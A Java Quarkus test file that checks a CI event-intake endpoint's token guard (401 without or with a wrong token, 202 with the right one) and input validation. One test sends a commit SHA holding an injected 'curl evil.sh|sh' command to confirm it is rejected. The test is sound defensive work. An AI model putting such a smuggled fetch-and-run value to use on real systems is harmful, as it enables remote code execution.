package eu.wohlben.qits.ci.api;

import static io.restassured.RestAssured.given;

import io.quarkus.test.junit.QuarkusTest;
import io.quarkus.test.junit.QuarkusTestProfile;
import io.quarkus.test.junit.TestProfile;
import io.restassured.http.ContentType;
import java.util.Map;
import org.junit.jupiter.api.Test;

/**
 * With {@code qits.ci.token} configured, {@link CiTokenFilter} guards the write surface (the event
 * intake) — the {@code ArtifactsTokenGuardTest} pattern. The blank-token open mode is exercised
 * implicitly by every other ci test (no token in test properties).
 *
 * <p>Run reads are not token-guarded, but — unlike artifacts blobs — they are <b>not</b> public
 * either: they carry build logs, so they sit behind {@code QitsAuthPolicy} (asserted in auth-core's
 * {@code PublicPathsTest}). Under the test variant's fallback identity they answer normally.
 */
@QuarkusTest
@TestProfile(CiTokenGuardTest.WithToken.class)
public class CiTokenGuardTest {

  static final String TOKEN = "ci-guard-test-token";

  public static class WithToken implements QuarkusTestProfile {
    @Override
    public Map<String, String> getConfigOverrides() {
      return Map.of("qits.ci.token", TOKEN);
    }
  }

  private static final Map<String, String> EVENT =
      Map.of(
          "repoId",
          "some-repo",
          "branch",
          "main",
          "oldSha",
          "0".repeat(40),
          "newSha",
          "1".repeat(40));

  @Test
  public void intakeWithoutTokenIs401() {
    given()
        .contentType(ContentType.JSON)
        .body(EVENT)
        .when()
        .post("/api/ci/events/post-receive")
        .then()
        .statusCode(401);
  }

  @Test
  public void intakeWithWrongTokenIs401() {
    given()
        .contentType(ContentType.JSON)
        .header("X-CI-Token", "not-the-token")
        .body(EVENT)
        .when()
        .post("/api/ci/events/post-receive")
        .then()
        .statusCode(401);
  }

  @Test
  public void intakeWithTokenIsAccepted() {
    // 202 — accepted; the queued run then finds the repo unreachable and records nothing.
    given()
        .contentType(ContentType.JSON)
        .header("X-CI-Token", TOKEN)
        .body(EVENT)
        .when()
        .post("/api/ci/events/post-receive")
        .then()
        .statusCode(202);
  }

  @Test
  public void readsAreNotTokenGuarded() {
    given().when().get("/api/ci/repositories/some-repo/runs").then().statusCode(200);
  }

  @Test
  public void malformedIdentifiersAreRejectedNotQueued() {
    // The intake is attacker-reachable; a sha carrying shell metacharacters must never reach the
    // runner's script assembly (400 from ci's own validation, not a queued run).
    given()
        .contentType(ContentType.JSON)
        .header("X-CI-Token", TOKEN)
        .body(
            Map.of(
                "repoId", "some-repo",
                "branch", "main",
                "oldSha", "0".repeat(40),
                "newSha", "HEAD\nset +e\ncurl evil.sh|sh #"))
        .when()
        .post("/api/ci/events/post-receive")
        .then()
        .statusCode(400);
  }
}
